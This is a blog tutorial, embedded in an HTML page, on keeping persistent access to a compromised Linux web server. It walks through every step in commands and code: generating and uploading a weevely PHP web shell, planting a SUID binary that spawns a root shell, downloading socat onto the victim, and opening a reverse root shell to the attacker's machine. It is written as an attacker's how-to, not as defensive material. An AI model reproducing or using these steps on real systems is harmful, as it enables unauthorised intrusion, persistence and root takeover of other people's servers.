@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Persistent Backdoor in Linux Environment - Abdullah Khabir</title><meta name="Description" content="An InfoSec related Blog"><meta property="og:title" content="Persistent Backdoor in Linux Environment" />
+<meta property="og:description" content="So you have hacked a linux box. Next step should be leave a persistent backdoor so in case, it is rebooted, you have to repeat all those steps again and again.
+There are multiple methods available to create a persistent backdoor. Today I&rsquo;m going to explain how you can create a backdoor in webservers.
+Tools needed  socat weevely some common sense  Installing Tools weevely Install weevely if you don&rsquo;t have it." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://abdullah.today/persistent-backdoor-in-linux-environment/" />
+<meta property="og:image" content="https://abdullah.today/logo.png"/>
+<meta property="article:published_time" content="2021-02-18T14:53:36+05:00" />
+<meta property="article:modified_time" content="2021-02-18T14:53:36+05:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://abdullah.today/logo.png"/>
+
+<meta name="twitter:title" content="Persistent Backdoor in Linux Environment"/>
+<meta name="twitter:description" content="So you have hacked a linux box. Next step should be leave a persistent backdoor so in case, it is rebooted, you have to repeat all those steps again and again.
+There are multiple methods available to create a persistent backdoor. Today I&rsquo;m going to explain how you can create a backdoor in webservers.
+Tools needed  socat weevely some common sense  Installing Tools weevely Install weevely if you don&rsquo;t have it."/>
+<meta name="application-name" content="Abdullah Khabir">
+<meta name="apple-mobile-web-app-title" content="Abdullah Khabir"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://abdullah.today/persistent-backdoor-in-linux-environment/" /><link rel="prev" href="https://abdullah.today/things-to-do-after-new-openbsd-install/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Persistent Backdoor in Linux Environment",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/abdullah.today\/persistent-backdoor-in-linux-environment\/"
+        },"image": ["https:\/\/abdullah.today\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "backdoor, persistent backdoor, trojan, malware, RAT, security, weevely, super user, privileges escalation, pivoting","wordcount":  456 ,
+        "url": "https:\/\/abdullah.today\/persistent-backdoor-in-linux-environment\/","datePublished": "2021-02-18T14:53:36+05:00","dateModified": "2021-02-18T14:53:36+05:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "Abdullah Khabir","logo": "https:\/\/abdullah.today\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "Abdullah Khabir"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Abdullah Khabir"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw'></i></span>Allah is the Greatest!</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="Some reminders"> InfoSec </a><a class="menu-item" href="/quran/"> Quran </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Start typing to search..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Abdullah Khabir"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw'></i></span>Allah is the Greatest!</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Start typing to search..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="Some reminders">InfoSec</a><a class="menu-item" href="/quran/" title="">Quran</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><script data-ad-client="ca-pub-6819322586059940" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Persistent Backdoor in Linux Environment</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://abdullah.today" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>Abdullah Khabir</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-02-18">2021-02-18</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;456 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#tools-needed">Tools needed</a></li>
+        <li><a href="#installing-tools">Installing Tools</a>
+          <ul>
+            <li><a href="#weevely">weevely</a></li>
+            <li><a href="#socat">socat</a></li>
+          </ul>
+        </li>
+        <li><a href="#creating-backdoor">Creating backdoor</a></li>
+        <li><a href="#push-backdoor-to-web-server">Push backdoor to web server</a></li>
+        <li><a href="#executing-our-backdoor">Executing our backdoor</a></li>
+        <li><a href="#extending-our-backdoor">Extending our backdoor</a>
+          <ul>
+            <li><a href="#creating-suid-executable">Creating SUID executable</a></li>
+            <li><a href="#push-suid-bit-executable-to-victim">Push SUID bit executable to victim</a></li>
+            <li><a href="#push-socat-to-victim">Push socat to victim</a></li>
+          </ul>
+        </li>
+        <li><a href="#getting-root-shell">Getting root shell</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>So you have hacked a linux box. Next step should be leave a persistent backdoor
+so in case, it is rebooted, you have to repeat all those steps again and again.</p>
+<p>There are multiple methods available to create a persistent backdoor.
+Today I&rsquo;m going to explain how you can create a backdoor in webservers.</p>
+<h3 id="tools-needed">Tools needed</h3>
+<ul>
+<li>socat</li>
+<li>weevely</li>
+<li>some common sense</li>
+</ul>
+<h3 id="installing-tools">Installing Tools</h3>
+<h4 id="weevely">weevely</h4>
+<p>Install weevely if you don&rsquo;t have it. Its written in Python. Availabe in Kali Linux by default.</p>
+<p>If you don&rsquo;t have Kali Linux installed, just clone the repository and install
+it.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">git clone https://github.com/epinna/weevely3.git
+<span class="nb">cd</span> weevely3
+pip3 install -r requirements.txt --upgrade
+</code></pre></td></tr></table>
+</div>
+</div><p>If you don&rsquo;t have RUST installed, you can install weevely as</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nv">CRYPTOGRAPHY_DONT_BUILD_RUST</span><span class="o">=</span><span class="m">1</span> pip3 install -r requirements.txt --upgrade
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="socat">socat</h4>
+<p>Install socat for your OS. You can grab binaries from <a href="https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat" target="_blank" rel="noopener noreffer">here</a>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /usr/bin/socat
+chmod +x /usr/bin/socat
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="creating-backdoor">Creating backdoor</h3>
+<p>With weevely we are going to create a backdoor.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">weevely generate backdoor.php some_password
+</code></pre></td></tr></table>
+</div>
+</div><p>Replace some_password with some memorable password.</p>
+<p>If you get errors like no weevely found, go to git repository and run weevely.py
+with python.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">cd</span> weevely3
+python3 weevely.py generate backdoor.php some_password
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="push-backdoor-to-web-server">Push backdoor to web server</h3>
+<p>Now we have our backdoor created, next job is to push it to webserver. Copy it
+to webserver&rsquo;s root.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">scp backdoor.php 192.168.1.100:/var/www/html/backdoor.php
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="executing-our-backdoor">Executing our backdoor</h3>
+<p>You can execute your backdoor with weevely like this:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">weevely http://192.168.1.100/backdoor.php some_password
+</code></pre></td></tr></table>
+</div>
+</div><p>Replace some_password with the password you entered while creating this
+backdoor.</p>
+<p>Execute <code>ls</code> and you will get a shell.
+You can use :help to get other weevely options.
+Just type : and press TAB to get auto complete options.</p>
+<h3 id="extending-our-backdoor">Extending our backdoor</h3>
+<p>This backdoor will give you a normal user access. You can extend it. Lets do it.</p>
+<h4 id="creating-suid-executable">Creating SUID executable</h4>
+<p>In your local machine, create a new file with these contents:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">cat mysuid.c
+
+int main<span class="o">()</span> <span class="o">{</span>
+    setresuid<span class="o">(</span>0,0,0<span class="o">)</span><span class="p">;</span>
+    system<span class="o">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="o">)</span><span class="p">;</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Compile it, change permissions and set suid.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">gcc -o mysuid mysuid.c
+chown root:root mysuid
+chmod u+s mysuid
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="push-suid-bit-executable-to-victim">Push SUID bit executable to victim</h4>
+<p>Now push this executable to victim system as root.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">scp mysuid 192.168.1.100:/usr/bin/mysuid
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="push-socat-to-victim">Push socat to victim</h4>
+<p>If victim system doesn&rsquo;t have socat, push socat from local system or download
+binary from Github as stated above.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">scp /usr/bin/scoat 192.168.1.100:/usr/bin/socat
+</code></pre></td></tr></table>
+</div>
+</div><p>Or in victim system run this:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /usr/bin/socat
+chmod +x /usr/bin/socat
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="getting-root-shell">Getting root shell</h3>
+<p>On your local machine, run:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">socat file:<span class="sb">`</span>tty<span class="sb">`</span>,raw,echo<span class="o">=</span><span class="m">0</span> TCP-L:1337
+</code></pre></td></tr></table>
+</div>
+</div><p>Using weevely get a non-privileged shell. And run this:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">/usr/bin/socat exec:<span class="s1">&#39;/bin/bash -li&#39;</span>,pty,stderr,setsid,sigint,sane tcp:YOUR_ATTACK_MACHINE_IP:1337
+</code></pre></td></tr></table>
+</div>
+</div><p>You will get a shell. Now execute mysuid we copied earlier.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">/usr/bin/mysuid
+</code></pre></td></tr></table>
+</div>
+</div><p>You will get a root shell.</p>
+<p>Thanks for reading.</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-02-18</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://abdullah.today/persistent-backdoor-in-linux-environment/" data-title="Persistent Backdoor in Linux Environment" data-via="AbdullahToday" data-hashtags="backdoor,persistent backdoor,trojan,malware,RAT,security,weevely,super user,privileges escalation,pivoting"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://abdullah.today/persistent-backdoor-in-linux-environment/" data-hashtag="backdoor"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://abdullah.today/persistent-backdoor-in-linux-environment/" data-title="Persistent Backdoor in Linux Environment"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://abdullah.today/persistent-backdoor-in-linux-environment/" data-title="Persistent Backdoor in Linux Environment"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@2.14.0/icons/line.svg"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://abdullah.today/persistent-backdoor-in-linux-environment/" data-title="Persistent Backdoor in Linux Environment"><i class="fab fa-weibo fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/backdoor/">backdoor</a>,&nbsp;<a href="/tags/persistent-backdoor/">persistent backdoor</a>,&nbsp;<a href="/tags/trojan/">trojan</a>,&nbsp;<a href="/tags/malware/">malware</a>,&nbsp;<a href="/tags/rat/">RAT</a>,&nbsp;<a href="/tags/security/">security</a>,&nbsp;<a href="/tags/weevely/">weevely</a>,&nbsp;<a href="/tags/super-user/">super user</a>,&nbsp;<a href="/tags/privileges-escalation/">privileges escalation</a>,&nbsp;<a href="/tags/pivoting/">pivoting</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/things-to-do-after-new-openbsd-install/" class="prev" rel="prev" title="Things to Do After New OpenBSD Install"><i class="fas fa-angle-left fa-fw"></i>Things to Do After New OpenBSD Install</a></div>
+</div>
+<div id="comments"><div id="fb-root" class="comment"></div>
+            <div
+                class="fb-comments"
+                data-href="https://abdullah.today/persistent-backdoor-in-linux-environment/"
+                data-width="100%"
+                data-numposts="10"
+            ></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://developers.facebook.com/docs/plugins/comments/"></a>Facebook</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://abdullah.today" target="_blank">Abdullah Khabir</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><script type="text/javascript" src="https://connect.facebook.net/en_US/sdk.js#xfbml=1&amp;version=v5.0&amp;appId=457812464807680&amp;autoLogAppEvents=1" defer></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.2.0/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{},"search":{"algoliaAppID":"3L4LIEJSP4","algoliaIndex":"index-en","algoliaSearchKey":"5d79bed67aeb5ed5e5a990cfad81ebde","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
